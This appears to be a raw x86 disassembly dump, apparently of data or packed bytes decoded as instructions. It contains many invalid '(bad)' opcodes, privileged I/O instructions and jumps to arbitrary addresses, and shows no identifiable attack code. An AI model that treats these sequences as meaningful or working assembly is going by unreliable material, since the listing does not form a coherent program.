  43e81f:	aas    
  43e820:	push   esi
  43e821:	inc    edx
  43e822:	retf   
  43e823:	cs push esi
  43e825:	mov    ch,bl
  43e827:	jmp    0xfec0f369
  43e82c:	nop
  43e82d:	into   
  43e82e:	and    BYTE PTR [edx],0x88
  43e831:	jg     0x43e7ec
  43e833:	push   ecx
  43e834:	add    BYTE PTR [ebx],0x85
  43e837:	jp     0x43e7dd
  43e839:	mov    al,bh
  43e83b:	pop    ebp
  43e83c:	add    al,0xb4
  43e83e:	or     al,0x62
  43e840:	add    BYTE PTR [edx+0x6806e77],0x84
  43e847:	or     edx,DWORD PTR [ebx+eax*1+0x398e100]
  43e84e:	jae    0x43e8a8
  43e850:	add    esi,ebp
  43e852:	add    esp,DWORD PTR [edx+0x7f]
  43e855:	mov    BYTE PTR [ebp+0x7d038051],dl
  43e85b:	add    BYTE PTR [ebp-0x27],ch
  43e85e:	repnz clc 
  43e860:	arpl   WORD PTR [esi-0x269df022],bx
  43e866:	jmp    0x632905f5
  43e86b:	adc    esp,ebp
  43e86d:	and    al,0xd2
  43e86f:	mov    bl,BYTE PTR ds:0x61c372e9
  43e875:	sub    ah,BYTE PTR [ebx-0x22]
  43e878:	sub    eax,0xe4801c60
  43e87d:	sbb    al,0xba
  43e87f:	mov    ah,BYTE PTR [edx+0x2f]
  43e882:	jae    0x43e87a
  43e884:	cdq    
  43e885:	pusha  
  43e886:	sbb    al,0x74
  43e888:	fsubr  QWORD PTR [ebx]
  43e88a:	xchg   edx,eax
  43e88b:	mov    WORD PTR [eax+0x2dc8a679],ds
  43e891:	fldl2t 
  43e893:	add    esp,DWORD PTR [edx+0x5a]
  43e896:	jno    0x43e8b5
  43e898:	imul   ebx,DWORD PTR [esi-0x77],0x14
  43e89c:	(bad)  
  43e89d:	fstp   DWORD PTR [esi+0x27]
  43e8a0:	loope  0x43e876
  43e8a2:	aaa    
  43e8a3:	ret    0x631d
  43e8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e8a7:	or     esp,ecx
  43e8a9:	cwde   
  43e8aa:	int3   
  43e8ab:	or     ah,BYTE PTR [ebx]
  43e8ad:	fsubp  st(5),st
  43e8af:	add    esp,DWORD PTR [edx-0x27]
  43e8b2:	push   eax
  43e8b3:	mov    edi,0x82e9d96c
  43e8b8:	sti    
  43e8b9:	call   0x14b30a78
  43e8be:	push   ds
  43e8bf:	add    eax,DWORD PTR [eax]
  43e8c1:	pop    ebx
  43e8c2:	pop    ebp
  43e8c3:	repnz adc DWORD PTR [edx-0x27],esp
  43e8c7:	fidiv  WORD PTR [ebp+0x7f9496d7]
  43e8cd:	out    0xa6,al
  43e8cf:	sbb    ah,BYTE PTR [ebx-0x79]
  43e8d2:	pop    edx
  43e8d3:	pop    ds
  43e8d4:	or     esp,ebp
  43e8d6:	sub    eax,DWORD PTR [ecx]
  43e8d8:	icebp  
  43e8d9:	arpl   WORD PTR [ecx+0x750ef83],si
  43e8df:	xlat   BYTE PTR ds:[ebx]
  43e8e0:	fistp  WORD PTR [edi+0x5c5502dd]
  43e8e6:	push   ss
  43e8e7:	cld    
  43e8e8:	imul   dl
  43e8ea:	xchg   ebp,eax
  43e8eb:	not    DWORD PTR [esp+edx*2-0x1]
  43e8ef:	add    BYTE PTR [ebx+0x5e],dl
  43e8f2:	inc    DWORD PTR [eax]
  43e8f4:	rcr    edi,1
  43e8f6:	call   0x192cd1fb
  43e8fb:	sbb    DWORD PTR [ebx+0x60],eax
  43e8fe:	bound  eax,QWORD PTR [ebp-0x6b]
  43e901:	jl     0x43e961
  43e903:	push   ebp
  43e904:	(bad)  
  43e905:	jmp    0x43e930
  43e907:	sbb    DWORD PTR [eax],edi
  43e909:	xor    BYTE PTR [ebp-0x77],bh
  43e90c:	mul    BYTE PTR [ecx-0x27]
  43e90f:	mov    ebx,DWORD PTR [esi+eax*8]
  43e912:	(bad)
  43e915:	daa    
  43e916:	in     eax,dx
  43e917:	xor    edi,DWORD PTR [edi-0x61]
  43e91a:	fld    DWORD PTR [ecx]
  43e91c:	jmp    0xb92dc282
  43e921:	push   eax
  43e922:	fld    DWORD PTR [eax]
  43e924:	jb     0x43e926
  43e926:	daa    
  43e927:	cmc    
  43e928:	mov    edi,0xd971ae
  43e92d:	jmp    0xbe044193
  43e932:	pop    esi
  43e933:	call   0x36f7:0x917ef940
  43e93a:	ins    BYTE PTR es:[edi],dx
  43e93b:	sbb    DWORD PTR [ecx],ecx
  43e93d:	call   0xe9d546a0
  43e942:	popa   
  43e943:	fld    DWORD PTR [edi]
  43e945:	push   edi
  43e946:	and    edx,DWORD PTR [ebx-0x20]
  43e949:	loope  0x43e935
  43e94b:	popf   
  43e94c:	rol    DWORD PTR [eax],0x5e
  43e94f:	xchg   esi,eax
  43e950:	rol    BYTE PTR [eax],0x8
  43e953:	sub    ebp,DWORD PTR [edi+0xd8cb1f]
  43e959:	idiv   DWORD PTR [edx+0x3475c55b]
  43e95f:	popa   
  43e960:	les    eax,FWORD PTR [eax-0x57f1a67]
  43e966:	xchg   ebx,eax
  43e967:	mov    WORD PTR ds:0x7de5468b,es
  43e96d:	push   ebp
  43e96e:	mov    bl,0x1d
  43e970:	cmp    BYTE PTR [eax],bl
  43e972:	jns    0x43e9ac
  43e974:	aaa    
  43e975:	add    BYTE PTR [edx-0x74fff7f2],dl
  43e97b:	popa   
  43e97c:	inc    eax
  43e97d:	and    al,0xba
  43e97f:	add    DWORD PTR [ebx+ecx*4],eax
  43e982:	mov    al,0x59
  43e984:	(bad)  
  43e985:	bswap  eax
  43e987:	push   es
  43e988:	add    al,0x83
  43e98a:	add    BYTE PTR [edx],cl
  43e98c:	loopne 0x43e911
  43e98e:	shl    BYTE PTR [esi-0x31],0x7f
  43e992:	dec    edi
  43e993:	pop    ss
  43e994:	push   edx
  43e995:	idiv   bh
  43e997:	dec    ebx
  43e998:	fcomp  DWORD PTR [esi+0x0]
  43e99b:	fdivr  st,st(1)
  43e99d:	pop    ebp
  43e99e:	add    BYTE PTR [ecx-0x23],ah
  43e9a1:	jg     0x43e9fa
  43e9a3:	daa    
  43e9a4:	add    BYTE PTR [esi],dh
  43e9a6:	xor    BYTE PTR [ebx],cl
  43e9a8:	fdivr  DWORD PTR [ebp+0x4d]
  43e9ab:	add    esp,DWORD PTR [ecx+0x52]
  43e9ae:	clc    
  43e9af:	cmp    al,BYTE PTR [ecx]
  43e9b1:	add    bh,dh
  43e9b3:	push   0x8802d459
  43e9b8:	and    edi,edi
  43e9ba:	mov    ah,al
  43e9bc:	out    dx,eax
  43e9bd:	jg     0x43ea00
  43e9bf:	jmp    0x43ea1f
  43e9c1:	sbb    BYTE PTR [ebx],dh
  43e9c3:	mov    al,ds:0x2ee9f2c9
  43e9c8:	call   0xa7a5e9cd
  43e9cd:	dec    ebx
  43e9ce:	jno    0x43e977
  43e9d0:	test   dh,0xf7
  43e9d3:	mov    ebx,0x62001430
  43e9d8:	pop    es
  43e9d9:	iret   
  43e9da:	pop    es
  43e9db:	popf   
  43e9dc:	aas    
  43e9dd:	sbb    edi,esi
  43e9df:	int    0x41
  43e9e1:	add    eax,DWORD PTR [ebp-0x799a85f1]
  43e9e7:	jb     0x43e96b
  43e9e9:	add    edi,DWORD PTR [ebp-0x6c]
  43e9ec:	xchg   ecx,eax
  43e9ed:	out    dx,al
  43e9ee:	sbb    eax,0x7924e100
  43e9f3:	call   DWORD PTR [esi+eax*1+0x5b]
  43e9f7:	punpckldq mm0,DWORD PTR [edx+0x4b60b20a]
  43e9fe:	leave  
  43e9ff:	sti    
  43ea00:	fnstenv [ebx+0x4f]
  43ea03:	fbld   TBYTE PTR [eax]
  43ea05:	inc    DWORD PTR [edx+0x7]
  43ea08:	jmp    0x43e9d7
  43ea0a:	je     0x43ea08
  43ea0c:	sub    eax,0xd00f7b00
  43ea11:	inc    edx
  43ea12:	test   DWORD PTR [eax+0x72],ebx
  43ea15:	add    BYTE PTR [eax+0x7],bh
  43ea18:	ins    DWORD PTR es:[edi],dx
  43ea19:	std    
  43ea1a:	enter  0x620f,0x80
  43ea1e:	jb     0x43e9dc
  43ea20:	bound  esp,QWORD PTR [eax-0x4]
  43ea23:	jmp    FWORD PTR [esi+0x6a42868b]
  43ea29:	mov    ebx,0x606017bc
  43ea2e:	mov    esp,0xce3faff
  43ea33:	add    BYTE PTR [edx+0x7],ah
  43ea36:	les    ebx,FWORD PTR [edi]
  43ea38:	out    0xc0,eax
  43ea3a:	lock add eax,0xe63db7e9
  43ea40:	pop    edx
  43ea41:	call   FWORD PTR [ebp-0x2]
  43ea44:	fcmovu st,st(1)
  43ea46:	icebp  
  43ea47:	jb     0x43ea6b
  43ea49:	jmp    0xd9a5f037
  43ea4e:	xchg   ebp,eax
  43ea4f:	sbb    edx,ebx
  43ea51:	xor    al,0xf6
  43ea53:	inc    esp
  43ea54:	add    BYTE PTR [esi-0x16fa6c1f],bh
  43ea5a:	sub    al,0x6
  43ea5c:	mov    WORD PTR [eax],ds
  43ea5e:	test   BYTE PTR [edx-0x3d],ah
  43ea61:	push   ebp
  43ea62:	daa    
  43ea63:	call   0xe703:0xe9eb736b
  43ea6a:	sub    al,0xe2
  43ea6c:	mov    WORD PTR [edx],fs
  43ea6e:	icebp  
  43ea6f:	sbb    bl,BYTE PTR [edi+0x3e]
  43ea72:	mov    ebx,DWORD PTR [esi-0x166d7bfe]
  43ea78:	add    eax,DWORD PTR [edi+0x55796adc]
  43ea7e:	push   es
  43ea7f:	or     al,0x87
  43ea81:	call   0xde4ed41a
  43ea86:	sub    edx,edi
  43ea88:	add    esp,DWORD PTR [edx-0x1e]
  43ea8b:	dec    edi
  43ea8c:	add    eax,0x8e8e245b
  43ea91:	sbb    esp,DWORD PTR [esi-0x64393a77]
  43ea97:	icebp  
  43ea98:	mov    WORD PTR [eax-0x49a4156f],ss
  43ea9e:	xchg   ebx,eax
  43ea9f:	leave  
  43eaa0:	cmc    
  43eaa1:	or     ebx,DWORD PTR [esi+0x1e]
  43eaa4:	and    al,0xe1
  43eaa6:	cwde   
  43eaa7:	aad    0x6
  43eaa9:	in     eax,0x30
  43eaab:	fidiv  WORD PTR [edx-0x5e]
  43eaae:	jmp    0xd9a5f09c
  43eab3:	int    0x29
  43eab5:	fidiv  DWORD PTR [ebx]
  43eab7:	dec    esi
  43eab8:	mov    es,WORD PTR [eax]
  43eaba:	es pop esi
  43eabc:	sbb    al,BYTE PTR [esp+edi*8-0x20]
  43eac0:	add    BYTE PTR [eax],ch
  43eac2:	jg     0x43eaa6
  43eac4:	rol    DWORD PTR [edx+0x49],0xfb
  43eac8:	cld    
  43eac9:	jae    0x43ea6d
  43eacb:	jge    0x43ea55
  43eacd:	lods   al,BYTE PTR ds:[esi]
  43eace:	dec    edx
  43eacf:	pop    edx
  43ead0:	dec    ebp
  43ead1:	pop    es
  43ead2:	fldcw  WORD PTR [esi]
  43ead4:	call   0x512d833b
  43ead9:	cwde   
  43eada:	dec    ecx
  43eadb:	push   esp
  43eadc:	or     eax,0x4d5c61e9
  43eae1:	icebp  
  43eae2:	fstp   DWORD PTR [eax]
  43eae4:	sbb    DWORD PTR [edx-0x51113afc],edi
  43eaea:	arpl   WORD PTR [edi+esi*8-0x2839e17],dx
  43eaf1:	imul   ecx,DWORD PTR [eax],0xdf0b73e2
  43eaf7:	push   cs
  43eaf8:	cmc    
  43eaf9:	jmp    0xef184868
  43eafe:	popa   
  43eaff:	fld    DWORD PTR [edi]
  43eb01:	jg     0x43eb67
  43eb03:	nop
  43eb04:	inc    ebp
  43eb05:	lods   eax,DWORD PTR ds:[esi]
  43eb06:	xlat   BYTE PTR ds:[ebx]
  43eb07:	lahf   
  43eb08:	ror    DWORD PTR [ecx-0xe40f1dc],cl
  43eb0e:	call   0xaa2ee43e
  43eb13:	or     eax,0xb34ff9f7
  43eb18:	mov    ebp,DWORD PTR [esi]
  43eb1a:	xchg   BYTE PTR [eax+eax*8-0xb],bl
  43eb1e:	add    BYTE PTR [ebx+0x56],dl
  43eb21:	retf   
  43eb22:	push   0xe90091c1
  43eb27:	popa   
  43eb28:	pop    eax
  43eb29:	dec    eax
  43eb2a:	icebp  
  43eb2b:	out    dx,al
  43eb2c:	and    DWORD PTR [ecx],esp
  43eb2e:	jb     0x43eacf
  43eb30:	dec    edi
  43eb31:	call   0x513c417
  43eb36:	push   esi
  43eb37:	and    esp,ecx
  43eb39:	add    BYTE PTR [eax],al
  43eb3b:	or     ebp,ebx
  43eb3d:	add    BYTE PTR [ebp+edx*1+0x65],dh
  43eb41:	pop    edx
  43eb42:	in     al,dx
  43eb43:	cmp    bh,dh
  43eb45:	jmp    FWORD PTR [ecx-0x7]
  43eb48:	push   edi
  43eb49:	push   edx
  43eb4a:	in     al,dx
  43eb4b:	push   ebx
  43eb4c:	test   al,0xea
  43eb4e:	mov    edi,esp
  43eb50:	hlt    
  43eb51:	inc    esi
  43eb52:	push   eax
  43eb53:	arpl   WORD PTR [esi+0x5dbb0012],bx
  43eb59:	push   edx
  43eb5a:	clc    
  43eb5b:	xor    bl,BYTE PTR [edx-0x397fccf1]
  43eb61:	repnz (bad) 
  43eb63:	mov    esp,0xbbfff790
  43eb68:	or     DWORD PTR [ecx+0x10],eax
  43eb6b:	mov    edx,DWORD PTR [eax+0x7c2ffff7]
  43eb71:	je     0x43eb71
  43eb73:	mov    eax,DWORD PTR [ebp+0x11168315]
  43eb79:	clc    
  43eb7a:	push   cs
  43eb7b:	lss    ecx,FWORD PTR [eax]
  43eb7e:	add    BYTE PTR [ebx+0x2b2e1],cl
  43eb84:	mov    ah,0x97
  43eb86:	sti    
  43eb87:	mov    eax,ebp
  43eb89:	and    eax,0x1ac842d8
  43eb8e:	add    BYTE PTR [ecx-0x280af272],cl
  43eb94:	mov    eax,0xf5720812
  43eb99:	pop    esp
  43eb9a:	inc    eax
  43eb9b:	and    BYTE PTR [edx+0xb8537b1],dh
  43eba1:	xor    ah,0x88
  43eba4:	push   ebx
  43eba5:	jmp    0xdc4f339b
  43ebaa:	idiv   bh
  43ebac:	or     eax,DWORD PTR [eax-0x82977e7]
  43ebb2:	mov    dh,0xeb
  43ebb4:	bound  edi,QWORD PTR [edx-0x1b]
  43ebb7:	std    
  43ebb8:	(bad)  
  43ebb9:	ins    BYTE PTR es:[edi],dx
  43ebba:	pop    edi
  43ebbb:	xchg   DWORD PTR [edi+0x5a508525],ebx
  43ebc1:	jno    0x43eb90
  43ebc3:	out    0xf,eax
  43ebc5:	scas   al,BYTE PTR es:[edi]
  43ebc6:	add    eax,DWORD PTR [eax]
  43ebc8:	fldenv [ebx+edi*2-0x7a]
  43ebcc:	and    eax,0x91d52dda
  43ebd1:	call   0x3f1cf53a
  43ebd6:	and    eax,DWORD PTR [ebx-0x3eff9a5e]
  43ebdc:	and    dh,BYTE PTR [edx-0x7d9dfffd]
  43ebe2:	inc    eax
  43ebe3:	add    BYTE PTR [edi-0x7e],ah
  43ebe6:	add    eax,DWORD PTR [eax]
  43ebe8:	add    BYTE PTR [ebp+0x66001336],ch
  43ebee:	add    BYTE PTR [ebx],0x9
  43ebf1:	fiadd  WORD PTR [esi]
  43ebf3:	std    
  43ebf4:	jmp    DWORD PTR [edx-0x5]
  43ebf7:	mov    bh,0x3f
  43ebf9:	fldlg2 
  43ebfb:	js     0x43eb83
  43ebfd:	daa    
  43ebfe:	dec    esi
  43ebff:	cmp    edi,DWORD PTR [edi-0x41758b14]
  43ec05:	(bad)  [eax+esi*2+0x77aea282]
  43ec0c:	ins    BYTE PTR es:[edi],dx
  43ec0d:	bound  eax,QWORD PTR [eax-0x5f5a7afd]
  43ec13:	add    dh,0xd6
  43ec16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ec17:	mov    al,BYTE PTR [esi+0x72]
  43ec1a:	stc    
  43ec1b:	leave  
  43ec1c:	shl    edi,cl
  43ec1e:	dec    ecx
  43ec1f:	lock xor ebp,ecx
  43ec22:	out    0x1c,eax
  43ec24:	test   DWORD PTR [eax-0x5db6d554],ebx
  43ec2a:	sti    
  43ec2b:	rcl    BYTE PTR [edi],cl
  43ec2d:	jmp    0x43ec08
  43ec2f:	lods   al,BYTE PTR ds:[esi]
  43ec30:	pop    edi
  43ec31:	push   ss
  43ec32:	xchg   edi,eax
  43ec33:	and    cl,BYTE PTR [edx-0x6d]
  43ec36:	aam    0x2
  43ec38:	rol    DWORD PTR [ecx],1
  43ec3a:	arpl   WORD PTR [ebx],bp
  43ec3c:	mov    edx,DWORD PTR [eax-0x5f75666f]
  43ec42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ec43:	jmp    0x4f6b:0x9a2c01c0
  43ec4a:	leave  
  43ec4b:	jmp    0x152aec53
  43ec50:	push   ss
  43ec51:	mov    esi,DWORD PTR [eax]
  43ec53:	xchg   ecx,eax
  43ec54:	push   0x40
  43ec56:	pop    ecx
  43ec57:	xchg   BYTE PTR [esi-0x16249ded],ah
  43ec5d:	add    esi,DWORD PTR [esi]
  43ec5f:	repz jb 0x43ec33
  43ec62:	mov    cl,0x62
  43ec64:	pushf  
  43ec65:	jnp    0x43ec4d
  43ec67:	push   ds
  43ec68:	rcl    cl,cl
  43ec6a:	adc    eax,0x762f0228
  43ec6f:	fldl2t 
  43ec71:	mov    dh,BYTE PTR [eax]
  43ec73:	xchg   ecx,eax
  43ec74:	jo     0x43ec34
  43ec76:	jne    0x43ecda
  43ec78:	and    al,0x70
  43ec7a:	cmp    al,0x14
  43ec7c:	mov    BYTE PTR [edx],0x92
  43ec7f:	shl    BYTE PTR [esi],0xc4
  43ec82:	fsub   QWORD PTR [edx+eax*8]
  43ec85:	sub    dl,0x18
  43ec88:	jmp    0x6203:0xd825e106
  43ec8f:	xchg   esi,eax
  43ec90:	les    edx,FWORD PTR es:[ebp-0x72]
  43ec94:	jmp    0xe81a0f9c
  43ec99:	add    esp,DWORD PTR [edx-0x27]
  43ec9c:	mov    ?,WORD PTR [esi+0x3f1d96d]
  43eca2:	(bad)  
  43eca3:	ficomp WORD PTR [ebp+0x7e]
  43eca6:	sub    eax,0xe0e9008e
  43ecab:	adc    dh,ch
  43ecad:	jmp    0xf7744216
  43ecb2:	add    BYTE PTR [ecx-0x27],ah
  43ecb5:	xor    ebp,DWORD PTR [ecx]
  43ecb7:	ficom  DWORD PTR [esi]
  43ecb9:	add    esi,esp
  43ecbb:	mov    bh,0xe1
  43ecbd:	adc    BYTE PTR [ecx+0x72ed1aee],ch
  43ecc3:	mov    ah,0xed
  43ecc5:	mov    DWORD PTR [ebp+ecx*4+0x3ebdc05b],ebp
  43eccc:	push   esp
  43eccd:	dec    eax
  43ecce:	int    0xee
  43ecd0:	and    cl,ch
  43ecd2:	ins    BYTE PTR es:[edi],dx
  43ecd3:	or     dl,BYTE PTR es:[eax]
  43ecd6:	jb     0x43ec7c
  43ecd8:	int    0x3b
  43ecda:	mov    eax,ds:0x6207fc81
  43ecdf:	xchg   edx,eax
  43ece0:	test   eax,0x5615ac8a
  43ece5:	cld    
  43ece6:	repnz xor al,0x19
  43ece9:	inc    ecx
  43ecea:	bound  edx,QWORD PTR [edx+0x3d6c8385]
  43ecf0:	mov    ?,WORD PTR [ebx-0xf]
  43ecf3:	jmp    0x7291:0xcd22ed1a
  43ecfa:	xchg   esi,eax
  43ecfb:	neg    DWORD PTR [eax]
  43ecfd:	adc    ecx,ebp
  43ecff:	arpl   cx,bx
  43ed01:	add    BYTE PTR ds:0xb5455467,bh
  43ed07:	fld    TBYTE PTR [edx]
  43ed09:	stc    
  43ed0a:	bound  esp,QWORD PTR [edi+0x361b51e5]
  43ed10:	jne    0x43ec9f
  43ed12:	cli    
  43ed13:	popa   
  43ed14:	(bad)  [ebx+0x53ce0034]
  43ed1a:	aas    
  43ed1b:	icebp  
  43ed1c:	ficom  DWORD PTR [edi]
  43ed1e:	in     eax,dx
  43ed1f:	sar    ah,0x90
  43ed22:	add    eax,DWORD PTR [eax]
  43ed24:	fistp  DWORD PTR [edx+0x7a]
  43ed27:	in     al,0x3b
  43ed29:	pusha  
  43ed2a:	push   edx
  43ed2b:	clc    
  43ed2c:	cmp    al,0xc
  43ed2e:	mov    bl,0xd
  43ed30:	or     ebx,ecx
  43ed32:	fisttp QWORD PTR [esi]
  43ed34:	nop
  43ed35:	dec    esi
  43ed36:	pop    ss
  43ed37:	test   DWORD PTR [ebx],edi
  43ed39:	mov    DWORD PTR [eax],eax
  43ed3b:	(bad)  
  43ed3c:	mov    ebx,0xb0000e4
  43ed41:	fld    st(1)
  43ed43:	inc    edi
  43ed44:	retf   
  43ed45:	fadd   DWORD PTR [eax]
  43ed47:	add    bl,bh
  43ed49:	int    0x0
  43ed4b:	pop    es
  43ed4c:	sti    
  43ed4d:	fadd   DWORD PTR [eax]
  43ed4f:	test   DWORD PTR [ecx+ebp*8],0xd8cb1000
  43ed56:	or     DWORD PTR [ebx+edx*2+0x380000d5],eax
  43ed5d:	test   bl,bh
  43ed5f:	add    BYTE PTR [esp+ecx*1-0x2734f289],bl
  43ed66:	and    eax,0x23793ec0
  43ed6b:	add    BYTE PTR [esi+edi*1+0x5fcb100b],bh
  43ed72:	inc    edx
  43ed73:	hlt    
  43ed74:	adc    BYTE PTR [ebp+0x17],cl
  43ed77:	mov    DWORD PTR [esi],edi
  43ed79:	stc    
  43ed7a:	add    al,0x0
  43ed7d:	daa    
  43ed7e:	mov    eax,0x6067487d
  43ed83:	dec    edx
  43ed84:	aam    0x6
  43ed86:	pop    ds
  43ed87:	je     0x43eda0
  43ed89:	lock xchg esp,eax
  43ed8b:	aaa    
  43ed8c:	cmp    eax,DWORD PTR [ebx-0x43]
  43ed8f:	xadd   BYTE PTR gs:[ebx-0x679752d],bl
  43ed97:	jg     0x43ed9d
  43ed99:	push   ecx
  43ed9a:	add    eax,0xf7624041
  43ed9f:	(bad)  
  43eda0:	mul    ecx
  43eda2:	fsub   QWORD PTR [eax-0x1]
  43eda5:	mov    cl,0x8a
  43eda7:	mov    BYTE PTR [edx+0x36],al
  43edaa:	xchg   edi,eax
  43edab:	mov    dh,0xfb
  43edad:	mov    al,0xc3
  43edaf:	fs inc eax
  43edb1:	jb     0x43ed35
  43edb3:	add    DWORD PTR [eax],eax
  43edb5:	bound  ebp,QWORD PTR [esi+0x269f8504]
  43edbb:	mov    DWORD PTR [edx+0xa],edx
  43edbe:	div    DWORD PTR [edi+edx*1-0x182caf6d]
  43edc5:	jmp    FWORD PTR [edi+0x64d90003]
  43edcb:	jnp    0x43ed53
  43edcd:	popf   
  43edce:	stos   BYTE PTR es:[edi],al
  43edcf:	mov    BYTE PTR [edx-0x2a],al
  43edd2:	fdiv   DWORD PTR [edi-0x7f2d9e05]
  43edd8:	jp     0x43eda0
  43edda:	or     DWORD PTR [edx+0x7672ca52],0x826f0002
  43ede4:	add    esp,ebp
  43ede6:	fs pop es
  43ede8:	mov    ch,0x1f
  43edea:	out    0xc1,eax
  43edec:	out    0x0,eax
  43edee:	popf   
  43edef:	inc    ecx
  43edf0:	pop    ss
  43edf1:	add    BYTE PTR [edx-0x7e],ah
  43edf4:	add    eax,ecx
  43edf6:	pop    ebp
  43edf7:	mov    al,BYTE PTR [ebx]
  43edf9:	add    BYTE PTR [edx-0x5d],ah
  43edfc:	retf   
  43edfd:	punpckldq mm0,DWORD PTR [eax-0x2309fffd]
  43ee04:	jg     0x43edff
  43ee06:	push   edx
  43ee07:	iret   
  43ee08:	adc    al,0x8b
  43ee0a:	leave  
  43ee0b:	add    DWORD PTR [ebx],0xf1ff6200
  43ee11:	sti    
  43ee12:	bound  ebp,QWORD PTR [ebx-0x26993181]
  43ee18:	jmp    0xeb874920
  43ee1d:	jb     0x43edb7
  43ee1f:	lea    esp,[edx+0x42]
  43ee22:	cs jp  0x43ee50
  43ee25:	xchg   DWORD PTR [ebx],esp
  43ee27:	loop   0x43ee99
  43ee29:	fnstenv ds:0x2b87a1d7
  43ee2f:	jmp    0xc16:0x426a51fb
  43ee36:	dec    edi
  43ee37:	mov    al,0xee
  43ee39:	mov    BYTE PTR [esi],dl
  43ee3b:	(bad)  
  43ee3c:	push   esi
  43ee3d:	jae    0x43ee75
  43ee3f:	scas   al,BYTE PTR es:[edi]
  43ee40:	sbb    bh,BYTE PTR [edx-0x1a]
  43ee43:	adc    cl,BYTE PTR [edx]
  43ee45:	mov    DWORD PTR [eax],eax
  43ee47:	mov    ch,0x5
  43ee49:	fdivr  DWORD PTR [esi-0x66]
  43ee4c:	jmp    0x56a05b79
  43ee51:	dec    eax
  43ee52:	add    eax,0x7ef621e5
  43ee57:	xor    bh,BYTE PTR [ecx-0x278239da]
  43ee5d:	jmp    0xea435065
  43ee62:	fnstsw WORD PTR [ebp+0x235bea00]
  43ee68:	out    0xe9,eax
  43ee6a:	add    esp,edi
  43ee6c:	sbb    al,0xf2
  43ee6e:	jle    0x43ee80
  43ee70:	xchg   ecx,eax
  43ee71:	pusha  
  43ee72:	retf   
  43ee73:	jne    0x43eed5
  43ee75:	test   al,0x33
  43ee77:	mov    ds:0x6203f2d2,eax
  43ee7c:	fnop   
  43ee7e:	call   FWORD PTR [ecx-0x27]
  43ee81:	jmp    0x5afd6a0c
  43ee86:	test   DWORD PTR es:[ebx],0x555b03be
  43ee8d:	and    al,BYTE PTR [eax]
  43ee8f:	(bad)  
  43ee90:	fld    DWORD PTR [eax]
  43ee92:	out    0x1b,al
  43ee94:	mov    esi,?
  43ee96:	sbb    al,0xd2
  43ee98:	push   ebp
  43ee99:	(bad)  
  43ee9a:	mov    edx,0xa783ccc1
  43ee9f:	dec    ecx
  43eea0:	push   ebx
  43eea1:	dec    ebp
  43eea2:	xchg   ecx,eax
  43eea3:	fs mov cl,0x83
  43eea6:	pop    DWORD PTR [ecx+0x72d6fb]
  43eeac:	ins    BYTE PTR es:[edi],dx
  43eead:	push   ebp
  43eeae:	ret    
  43eeaf:	test   al,0xc1
  43eeb1:	fiadd  DWORD PTR [ecx+0x906188]
  43eeb7:	jmp    0x2acf9018
  43eebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eebd:	jb     0x43eec7
  43eebf:	sub    BYTE PTR [esi-0x2e],bh
  43eec2:	sbb    eax,0xf78a70e9
  43eec7:	jmp    0x75a6:0xf145559e
  43eece:	sbb    dl,ch
  43eed0:	pushf  
  43eed1:	push   ebx
  43eed2:	aas    
  43eed3:	rcr    DWORD PTR [esi-0x35],1
  43eed6:	xor    dl,bh
  43eed8:	and    al,0xbd
  43eeda:	out    dx,al
  43eedb:	cs pop eax
  43eedd:	rol    DWORD PTR [eax],cl
  43eedf:	jmp    0xe5bbfb45
  43eee4:	popa   
  43eee5:	loopne 0x43ef63
  43eee7:	dec    edi
  43eee8:	mov    ah,0x89
  43eeea:	not    DWORD PTR [ebx-0x6cff0c9f]
  43eef0:	popa   
  43eef1:	add    DWORD PTR ds:0x8bd961c2,0x3f529994
  43eefb:	add    DWORD PTR [ecx],ecx
  43eefd:	int3   
  43eefe:	xor    BYTE PTR [edx-0x53],dh
  43ef01:	cmp    DWORD PTR [edi-0x8768112],0x50edee9
  43ef0b:	add    BYTE PTR [esi-0x28],bh
  43ef0e:	jl     0x43eeec
  43ef10:	add    BYTE PTR [eax-0x2b],dh
  43ef13:	add    BYTE PTR [ebx+0xf02d996],al
  43ef19:	mov    edi,0x3bfffd2f
  43ef1e:	pop    esi
  43ef1f:	js     0x43ef25
  43ef21:	cmp    edx,DWORD PTR [ecx+0x5f058b13]
  43ef27:	(bad)  
  43ef28:	pop    es
  43ef29:	clc    
  43ef2a:	es sbb eax,0xed2fcf1
  43ef30:	add    BYTE PTR [ebx],bh
  43ef32:	fstp   st(7)
  43ef34:	pop    edx
  43ef35:	add    ch,bl
  43ef37:	add    BYTE PTR [ebx+0x2a65de85],al
  43ef3d:	mov    al,0xd3
  43ef3f:	mov    ebx,DWORD PTR [ebx+0xdcfb]
  43ef45:	mov    BYTE PTR [eax-0x5],bh
  43ef48:	add    BYTE PTR [ecx+eiz*2],dl
  43ef4b:	xchg   esi,eax
  43ef4c:	or     edi,ebx
  43ef4e:	fmul   QWORD PTR [ecx]
  43ef50:	mov    dh,0xf9
  43ef52:	or     DWORD PTR [ebx-0x4],ecx
  43ef55:	inc    eax
  43ef56:	sbb    eax,ebp
  43ef58:	loopne 0x43ef63
  43ef5a:	pop    esi
  43ef5b:	ror    DWORD PTR [eax],0x52
  43ef5e:	mov    al,0xef
  43ef60:	add    esp,DWORD PTR [ebx]
  43ef62:	pop    esi
  43ef63:	stc    
  43ef64:	add    ebx,ecx
  43ef66:	sub    bh,BYTE PTR [ebp-0x35]
  43ef69:	jp     0x43ef91
  43ef6b:	jge    0x43ef30
  43ef6d:	cmp    ah,bh
  43ef6f:	test   BYTE PTR [edx+0x4f7fde5b],0x0
  43ef76:	(bad)  
  43ef77:	pop    ebp
  43ef78:	out    dx,eax
  43ef79:	add    ecx,DWORD PTR [ecx+eiz*4]
  43ef7c:	clc    
  43ef7d:	and    al,0xfe
  43ef7f:	xor    ebx,ecx
  43ef81:	inc    ebx
  43ef82:	jnp    0x43ef9f
  43ef84:	fld    QWORD PTR [edx]
  43ef86:	bound  esi,QWORD PTR [edi]
  43ef88:	or     BYTE PTR [ebx],cl
  43ef8a:	bound  esi,QWORD PTR [edx+0x3]
  43ef8d:	jge    0x43f00b
  43ef8f:	jae    0x43efeb
  43ef91:	clc    
  43ef92:	pop    eax
  43ef93:	jb     0x43ef98
  43ef95:	test   DWORD PTR ds:0x55f0749a,esp
  43ef9b:	aaa    
  43ef9c:	jl     0x43f018
  43ef9e:	pop    esi
  43ef9f:	js     0x43efe9
  43efa1:	add    BYTE PTR [ecx+0x72],dh
